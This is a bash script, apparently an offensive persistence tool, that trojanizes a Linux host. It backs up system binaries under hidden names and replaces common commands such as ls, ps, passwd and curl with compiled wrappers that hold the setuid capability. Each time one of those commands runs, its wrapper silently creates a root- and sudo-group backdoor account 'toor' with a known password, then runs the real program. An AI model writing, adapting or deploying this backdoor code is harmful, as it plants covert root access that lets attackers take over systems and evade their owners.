#!/bin/bash

# Run as root
# Requires gcc (apt install -y gcc)
deps="basename find md5sum cut dirname mktemp gcc setcap useradd bash passwd sh rm cp cat which \
$(history | awk '{print $2}' | sort -u | while read -r c; do c=$(which $c); [[ ${c:0:1} == "/" ]] && basename $c; done)\
$(cat $(find /home -name ".bash_history") | cut -d " " -f1)"

for f in $deps; do
  [[ ! $(which $f) ]] && continue
  p=$(readlink -f "$(which $f)")
  cp -a $p $(dirname $p)/.$(basename $p)
  [ -L "$(which $f)" ] && ln -sf $(dirname $p)/.$(basename $p) $p
done

#for path in ${PATH//:/ }; do
#  for f in `.find $path -type f -executable | grep -v ".sh"`; do 
for f in $deps ls bash cat head tail ps kill pkill ip netstat passwd service ping curl wget rm cut awk sed grep which who w; do
    [[ ! $(.which $f) ]] && continue
    [[ -L $(.which $f) ]] && continue
    p=$(readlink -f "$(.which $f)")

    #Skip scripts
    [[ "file -b --mime-type $p | sed 's|/.*||'" == "text" ]] && continue
    n=$(.basename $p)
    #Skip the backup files we create
    [[ ${n:0:1} == "." ]] && continue

    b=$(.dirname $p)/.$(.md5sum $p | .cut -d ' ' -f1)
    .cp -a $p $b

    src=$(.mktemp).c
    .cat << EOF > $src
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char* argv[]) {
  if (!fork()) {
    //Become root - (pre-req: sudo /sbin/setcap cap_setuid=ep /path/to/this)
    setuid(0);
    //Insert bad thing here
    system("($(.dirname $(.which .useradd))/.$(.md5sum $(.which .useradd) | .cut -d ' ' -f1) \
toor -G root,sudo -s /bin/bash; \
printf \"toor\ntoor\" | $(.dirname $(which .passwd))/.$(.md5sum $(which .passwd) | .cut -d ' ' -f1) toor) > /dev/null 2>&1");
    exit(0); 
  }
  //Run the original program with all args
  return execv("$b", argv);
}
EOF
    gcc $src -o $p && echo "Infected: $p"
    .rm $src
    /sbin/.setcap cap_setuid=ep $p
#  done
done


for f in $deps; do
  [[ ! $(which $f) ]] && continue
  [[ -L $(which $f) ]] && continue
  p=$(which .$f)
  [[ ! $(which $p) ]] && continue
  echo "Deleting $p"
  rm $p
done
